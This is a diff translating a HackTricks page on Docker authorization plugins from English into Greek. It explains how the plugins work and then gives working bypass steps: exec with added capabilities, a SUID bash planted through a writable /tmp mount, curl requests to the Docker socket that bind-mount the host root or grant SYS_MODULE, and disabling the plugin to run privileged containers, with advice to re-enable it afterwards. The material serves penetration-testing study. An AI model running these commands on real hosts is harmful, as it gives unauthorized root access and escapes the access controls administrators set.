@@ -1,75 +1,70 @@
 {{#include ../../../banners/hacktricks-training.md}}
 
-**Docker’s** out-of-the-box **authorization** model is **all or nothing**. Any user with permission to access the Docker daemon can **run any** Docker client **command**. The same is true for callers using Docker’s Engine API to contact the daemon. If you require **greater access control**, you can create **authorization plugins** and add them to your Docker daemon configuration. Using an authorization plugin, a Docker administrator can **configure granular access** policies for managing access to the Docker daemon.
+**Το** out-of-the-box **μοντέλο εξουσιοδότησης του Docker** είναι **όλα ή τίποτα**. Οποιοσδήποτε χρήστης έχει άδεια πρόσβασης στο Docker daemon μπορεί να **εκτελέσει οποιαδήποτε** εντολή Docker client. Το ίδιο ισχύει και για τους καλούντες που χρησιμοποιούν το Docker Engine API για να επικοινωνήσουν με το daemon. Εάν απαιτείτε **μεγαλύτερο έλεγχο πρόσβασης**, μπορείτε να δημιουργήσετε **plugins εξουσιοδότησης** και να τα προσθέσετε στη διαμόρφωση του Docker daemon σας. Χρησιμοποιώντας ένα plugin εξουσιοδότησης, ένας διαχειριστής Docker μπορεί να **διαμορφώσει λεπτομερείς πολιτικές πρόσβασης** για τη διαχείριση της πρόσβασης στο Docker daemon.
 
-# Basic architecture
+# Βασική αρχιτεκτονική
 
-Docker Auth plugins are **external** **plugins** you can use to **allow/deny** **actions** requested to the Docker Daemon **depending** on the **user** that requested it and the **action** **requested**.
+Τα Docker Auth plugins είναι **εξωτερικά** **plugins** που μπορείτε να χρησιμοποιήσετε για να **επιτρέψετε/αρνηθείτε** **ενέργειες** που ζητούνται από το Docker Daemon **ανάλογα** με τον **χρήστη** που το ζήτησε και την **ενέργεια** **που ζητήθηκε**.
 
-**[The following info is from the docs](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
+**[Οι παρακάτω πληροφορίες προέρχονται από τα docs](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-When an **HTTP** **request** is made to the Docker **daemon** through the CLI or via the Engine API, the **authentication** **subsystem** **passes** the request to the installed **authentication** **plugin**(s). The request contains the user (caller) and command context. The **plugin** is responsible for deciding whether to **allow** or **deny** the request.
+Όταν γίνεται μια **HTTP** **αίτηση** στο Docker **daemon** μέσω του CLI ή μέσω του Engine API, το **υποσύστημα αυθεντικοποίησης** **περνά** την αίτηση στα εγκατεστημένα **plugins αυθεντικοποίησης**. Η αίτηση περιέχει τον χρήστη (καλούντα) και το πλαίσιο εντολής. Το **plugin** είναι υπεύθυνο για την απόφαση αν θα **επιτρέψει** ή θα **αρνηθεί** την αίτηση.
 
-The sequence diagrams below depict an allow and deny authorization flow:
+Τα διαγράμματα ακολουθίας παρακάτω απεικονίζουν μια ροή εξουσιοδότησης επιτρεπόμενης και αρνητικής:
 
 ![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz_allow.png)
 
 ![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz_deny.png)
 
-Each request sent to the plugin **includes the authenticated user, the HTTP headers, and the request/response body**. Only the **user name** and the **authentication method** used are passed to the plugin. Most importantly, **no** user **credentials** or tokens are passed. Finally, **not all request/response bodies are sent** to the authorization plugin. Only those request/response bodies where the `Content-Type` is either `text/*` or `application/json` are sent.
+Κάθε αίτηση που αποστέλλεται στο plugin **περιλαμβάνει τον αυθεντικοποιημένο χρήστη, τις HTTP κεφαλίδες και το σώμα αίτησης/απάντησης**. Μόνο το **όνομα χρήστη** και η **μέθοδος αυθεντικοποίησης** που χρησιμοποιείται περνούν στο plugin. Το πιο σημαντικό, **κανένα** διαπιστευτήριο **χρήστη** ή tokens δεν περνούν. Τέλος, **όχι όλα τα σώματα αίτησης/απάντησης αποστέλλονται** στο plugin εξουσιοδότησης. Μόνο εκείνα τα σώματα αίτησης/απάντησης όπου το `Content-Type` είναι είτε `text/*` είτε `application/json` αποστέλλονται.
 
-For commands that can potentially hijack the HTTP connection (`HTTP Upgrade`), such as `exec`, the authorization plugin is only called for the initial HTTP requests. Once the plugin approves the command, authorization is not applied to the rest of the flow. Specifically, the streaming data is not passed to the authorization plugins. For commands that return chunked HTTP response, such as `logs` and `events`, only the HTTP request is sent to the authorization plugins.
+Για εντολές που μπορεί να αναλάβουν τη σύνδεση HTTP (`HTTP Upgrade`), όπως το `exec`, το plugin εξουσιοδότησης καλείται μόνο για τις αρχικές HTTP αιτήσεις. Μόλις το plugin εγκρίνει την εντολή, η εξουσιοδότηση δεν εφαρμόζεται στην υπόλοιπη ροή. Συγκεκριμένα, τα δεδομένα ροής δεν περνούν στα plugins εξουσιοδότησης. Για εντολές που επιστρέφουν τμηματική HTTP απάντηση, όπως το `logs` και το `events`, μόνο η HTTP αίτηση αποστέλλεται στα plugins εξουσιοδότησης.
 
-During request/response processing, some authorization flows might need to do additional queries to the Docker daemon. To complete such flows, plugins can call the daemon API similar to a regular user. To enable these additional queries, the plugin must provide the means for an administrator to configure proper authentication and security policies.
+Κατά τη διάρκεια της επεξεργασίας αίτησης/απάντησης, ορισμένες ροές εξουσιοδότησης μπορεί να χρειαστεί να κάνουν επιπλέον ερωτήματα στο Docker daemon. Για να ολοκληρωθούν αυτές οι ροές, τα plugins μπορούν να καλέσουν το daemon API όπως ένας κανονικός χρήστης. Για να επιτραπούν αυτές οι επιπλέον ερωτήσεις, το plugin πρέπει να παρέχει τα μέσα για έναν διαχειριστή να διαμορφώσει κατάλληλες πολιτικές αυθεντικοποίησης και ασφάλειας.
 
-## Several Plugins
+## Πολλά Plugins
 
-You are responsible for **registering** your **plugin** as part of the Docker daemon **startup**. You can install **multiple plugins and chain them together**. This chain can be ordered. Each request to the daemon passes in order through the chain. Only when **all the plugins grant access** to the resource, is the access granted.
+Είστε υπεύθυνοι για **την καταχώριση** του **plugin** σας ως μέρος της **εκκίνησης** του Docker daemon. Μπορείτε να εγκαταστήσετε **πολλαπλά plugins και να τα αλυσσοδέσετε**. Αυτή η αλυσίδα μπορεί να είναι διατεταγμένη. Κάθε αίτηση προς το daemon περνά με σειρά μέσω της αλυσίδας. Μόνο όταν **όλα τα plugins παραχωρήσουν πρόσβαση** στο πόρο, η πρόσβαση παραχωρείται.
 
-# Plugin Examples
+# Παραδείγματα Plugins
 
 ## Twistlock AuthZ Broker
 
-The plugin [**authz**](https://github.com/twistlock/authz) allows you to create a simple **JSON** file that the **plugin** will be **reading** to authorize the requests. Therefore, it gives you the opportunity to control very easily which API endpoints can reach each user.
+Το plugin [**authz**](https://github.com/twistlock/authz) σας επιτρέπει να δημιουργήσετε ένα απλό **JSON** αρχείο που το **plugin** θα **διαβάζει** για να εξουσιοδοτήσει τις αιτήσεις. Έτσι, σας δίνει την ευκαιρία να ελέγξετε πολύ εύκολα ποιες API endpoints μπορούν να φτάσουν σε κάθε χρήστη.
 
-This is an example that will allow Alice and Bob can create new containers: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
+Αυτό είναι ένα παράδειγμα που θα επιτρέπει στους Alice και Bob να δημιουργήσουν νέους κοντέινερ: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
 
-In the page [route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go) you can find the relation between the requested URL and the action. In the page [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) you can find the relation between the action name and the action
+Στη σελίδα [route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go) μπορείτε να βρείτε τη σχέση μεταξύ της ζητούμενης URL και της ενέργειας. Στη σελίδα [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) μπορείτε να βρείτε τη σχέση μεταξύ του ονόματος της ενέργειας και της ενέργειας.
 
-## Simple Plugin Tutorial
+## Απλός Οδηγός Plugin
 
-You can find an **easy to understand plugin** with detailed information about installation and debugging here: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)
+Μπορείτε να βρείτε ένα **εύκολο στην κατανόηση plugin** με λεπτομερείς πληροφορίες σχετικά με την εγκατάσταση και την αποσφαλμάτωση εδώ: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)
 
-Read the `README` and the `plugin.go` code to understand how is it working.
+Διαβάστε το `README` και τον κώδικα `plugin.go` για να κατανοήσετε πώς λειτουργεί.
 
-# Docker Auth Plugin Bypass
+# Παράκαμψη Docker Auth Plugin
 
-## Enumerate access
+## Καταμέτρηση πρόσβασης
 
-The main things to check are the **which endpoints are allowed** and **which values of HostConfig are allowed**.
+Τα κύρια πράγματα που πρέπει να ελέγξετε είναι **ποια endpoints επιτρέπονται** και **ποια τιμές του HostConfig επιτρέπονται**.
 
-To perform this enumeration you can **use the tool** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**.**
+Για να εκτελέσετε αυτή την καταμέτρηση μπορείτε να **χρησιμοποιήσετε το εργαλείο** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**.**
 
-## disallowed `run --privileged`
+## απαγορευμένο `run --privileged`
 
-### Minimum Privileges
-
+### Ελάχιστα Προνόμια
 ```bash
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 ```
+### Εκτέλεση ενός κοντέινερ και στη συνέχεια απόκτηση προνομιακής συνεδρίας
 
-### Running a container and then getting a privileged session
-
-In this case the sysadmin **disallowed users to mount volumes and run containers with the `--privileged` flag** or give any extra capability to the container:
-
+Σε αυτή την περίπτωση, ο διαχειριστής συστήματος **δεν επέτρεψε στους χρήστες να προσαρτούν όγκους και να εκτελούν κοντέινερ με την επιλογή `--privileged`** ή να δίνουν οποιαδήποτε επιπλέον δυνατότητα στο κοντέινερ:
 ```bash
 docker run -d --privileged modified-ubuntu
 docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
 See 'docker run --help'.
 ```
-
-However, a user can **create a shell inside the running container and give it the extra privileges**:
-
+Ωστόσο, ένας χρήστης μπορεί **να δημιουργήσει ένα shell μέσα στο τρέχον κοντέινερ και να του δώσει τα επιπλέον δικαιώματα**:
 ```bash
 docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
 #bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
@@ -81,42 +76,38 @@ docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be
 # With --cap-add=SYS_ADMIN
 docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
 ```
+Τώρα, ο χρήστης μπορεί να ξεφύγει από το κοντέινερ χρησιμοποιώντας οποιαδήποτε από τις [**προηγουμένως συζητηθείσες τεχνικές**](./#privileged-flag) και **να κλιμακώσει τα δικαιώματα** μέσα στον οικοδεσπότη.
 
-Now, the user can escape from the container using any of the [**previously discussed techniques**](./#privileged-flag) and **escalate privileges** inside the host.
+## Τοποθέτηση Εγγράψιμου Φακέλου
 
-## Mount Writable Folder
-
-In this case the sysadmin **disallowed users to run containers with the `--privileged` flag** or give any extra capability to the container, and he only allowed to mount the `/tmp` folder:
-
+Σε αυτή την περίπτωση, ο διαχειριστής συστήματος **απαγόρευσε στους χρήστες να εκτελούν κοντέινερ με την επιλογή `--privileged`** ή να δίνουν οποιαδήποτε επιπλέον δυνατότητα στο κοντέινερ, και επέτρεψε μόνο την τοποθέτηση του φακέλου `/tmp`:
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
 docker container> chown root:root /host/bash
 docker container> chmod u+s /host/bash
 host> /tmp/bash
- -p #This will give you a shell as root
+-p #This will give you a shell as root
 ```
-
 > [!NOTE]
-> Note that maybe you cannot mount the folder `/tmp` but you can mount a **different writable folder**. You can find writable directories using: `find / -writable -type d 2>/dev/null`
+> Σημειώστε ότι ίσως δεν μπορείτε να προσαρτήσετε τον φάκελο `/tmp`, αλλά μπορείτε να προσαρτήσετε έναν **διαφορετικό εγγράψιμο φάκελο**. Μπορείτε να βρείτε εγγράψιμους καταλόγους χρησιμοποιώντας: `find / -writable -type d 2>/dev/null`
 >
-> **Note that not all the directories in a linux machine will support the suid bit!** In order to check which directories support the suid bit run `mount | grep -v "nosuid"` For example usually `/dev/shm` , `/run` , `/proc` , `/sys/fs/cgroup` and `/var/lib/lxcfs` don't support the suid bit.
+> **Σημειώστε ότι δεν υποστηρίζουν όλοι οι κατάλογοι σε μια μηχανή linux το suid bit!** Για να ελέγξετε ποιους καταλόγους υποστηρίζει το suid bit, εκτελέστε `mount | grep -v "nosuid"` Για παράδειγμα, συνήθως οι `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` και `/var/lib/lxcfs` δεν υποστηρίζουν το suid bit.
 >
-> Note also that if you can **mount `/etc`** or any other folder **containing configuration files**, you may change them from the docker container as root in order to **abuse them in the host** and escalate privileges (maybe modifying `/etc/shadow`)
+> Σημειώστε επίσης ότι αν μπορείτε να **προσαρτήσετε το `/etc`** ή οποιονδήποτε άλλο φάκελο **που περιέχει αρχεία ρυθμίσεων**, μπορείτε να τα αλλάξετε από το docker container ως root προκειμένου να **τα εκμεταλλευτείτε στον host** και να κερδίσετε δικαιώματα (ίσως τροποποιώντας το `/etc/shadow`)
 
 ## Unchecked API Endpoint
 
-The responsibility of the sysadmin configuring this plugin would be to control which actions and with which privileges each user can perform. Therefore, if the admin takes a **blacklist** approach with the endpoints and the attributes he might **forget some of them** that could allow an attacker to **escalate privileges.**
+Η ευθύνη του sysadmin που ρυθμίζει αυτό το plugin θα είναι να ελέγχει ποιες ενέργειες και με ποια δικαιώματα μπορεί να εκτελεί κάθε χρήστης. Επομένως, αν ο διαχειριστής ακολουθήσει μια προσέγγιση **μαύρης λίστας** με τα endpoints και τα χαρακτηριστικά, μπορεί να **ξεχάσει μερικά από αυτά** που θα μπορούσαν να επιτρέψουν σε έναν επιτιθέμενο να **κερδίσει δικαιώματα.**
 
-You can check the docker API in [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
+Μπορείτε να ελέγξετε το docker API στο [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
 
 ## Unchecked JSON Structure
 
 ### Binds in root
 
-It's possible that when the sysadmin configured the docker firewall he **forgot about some important parameter** of the [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) like "**Binds**".\
-In the following example it's possible to abuse this misconfiguration to create and run a container that mounts the root (/) folder of the host:
-
+Είναι πιθανό ότι όταν ο sysadmin ρύθμισε το docker firewall, **ξέχασε κάποιο σημαντικό παράμετρο** του [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) όπως το "**Binds**".\
+Στο παρακάτω παράδειγμα είναι δυνατόν να εκμεταλλευτείτε αυτή τη λανθασμένη ρύθμιση για να δημιουργήσετε και να εκτελέσετε ένα container που προσαρτά τον ριζικό (/) φάκελο του host:
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
@@ -126,38 +117,30 @@ docker start f6932bc153ad #Start the created privileged container
 docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 #You can access the host filesystem
 ```
-
 > [!WARNING]
-> Note how in this example we are using the **`Binds`** param as a root level key in the JSON but in the API it appears under the key **`HostConfig`**
+> Σημειώστε πώς σε αυτό το παράδειγμα χρησιμοποιούμε το **`Binds`** παραμέτρο ως κλειδί επιπέδου ρίζας στο JSON αλλά στην API εμφανίζεται κάτω από το κλειδί **`HostConfig`**
 
 ### Binds in HostConfig
 
-Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
-
+Ακολουθήστε την ίδια οδηγία όπως με **Binds in root** εκτελώντας αυτή την **request** στην Docker API:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
-
 ### Mounts in root
 
-Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
-
+Ακολουθήστε τις ίδιες οδηγίες όπως με **Binds in root** εκτελώντας αυτήν την **αίτηση** στο Docker API:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
-
 ### Mounts in HostConfig
 
-Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
-
+Ακολουθήστε τις ίδιες οδηγίες όπως με **Binds in root** εκτελώντας αυτήν την **request** στο Docker API:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
-
 ## Unchecked JSON Attribute
 
-It's possible that when the sysadmin configured the docker firewall he **forgot about some important attribute of a parameter** of the [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) like "**Capabilities**" inside "**HostConfig**". In the following example it's possible to abuse this misconfiguration to create and run a container with the **SYS_MODULE** capability:
-
+Είναι πιθανό ότι όταν ο διαχειριστής συστήματος ρύθμισε το docker firewall **ξέχασε κάποιο σημαντικό χαρακτηριστικό μιας παραμέτρου** του [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) όπως το "**Capabilities**" μέσα στο "**HostConfig**". Στο παρακάτω παράδειγμα είναι δυνατόν να εκμεταλλευτούμε αυτή τη λανθασμένη ρύθμιση για να δημιουργήσουμε και να εκτελέσουμε ένα κοντέινερ με την ικανότητα **SYS_MODULE**:
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
@@ -167,14 +150,12 @@ docker exec -it c52a77629a91 bash
 capsh --print
 #You can abuse the SYS_MODULE capability
 ```
-
 > [!NOTE]
-> The **`HostConfig`** is the key that usually contains the **interesting** **privileges** to escape from the container. However, as we have discussed previously, note how using Binds outside of it also works and may allow you to bypass restrictions.
+> Το **`HostConfig`** είναι το κλειδί που συνήθως περιέχει τα **ενδιαφέροντα** **προνόμια** για να ξεφύγετε από το κοντέινερ. Ωστόσο, όπως έχουμε συζητήσει προηγουμένως, σημειώστε πώς η χρήση Binds εκτός αυτού λειτουργεί επίσης και μπορεί να σας επιτρέψει να παρακάμψετε περιορισμούς.
 
-## Disabling Plugin
+## Απενεργοποίηση Πρόσθετου
 
-If the **sysadmin** **forgotten** to **forbid** the ability to **disable** the **plugin**, you can take advantage of this to completely disable it!
-
+Εάν ο **sysadmin** **ξέχασε** να **απαγορεύσει** την ικανότητα να **απενεργοποιήσετε** το **πρόσθετο**, μπορείτε να εκμεταλλευτείτε αυτό για να το απενεργοποιήσετε εντελώς!
 ```bash
 docker plugin list #Enumerate plugins
 
@@ -186,8 +167,7 @@ docker plugin disable authobot
 docker run --rm -it --privileged -v /:/host ubuntu bash
 docker plugin enable authobot
 ```
-
-Remember to **re-enable the plugin after escalating**, or a **restart of docker service won’t work**!
+Θυμηθείτε να **επανενεργοποιήσετε το plugin μετά την εκχώρηση δικαιωμάτων**, ή μια **επανεκκίνηση της υπηρεσίας docker δεν θα λειτουργήσει**!
 
 ## Auth Plugin Bypass writeups
 
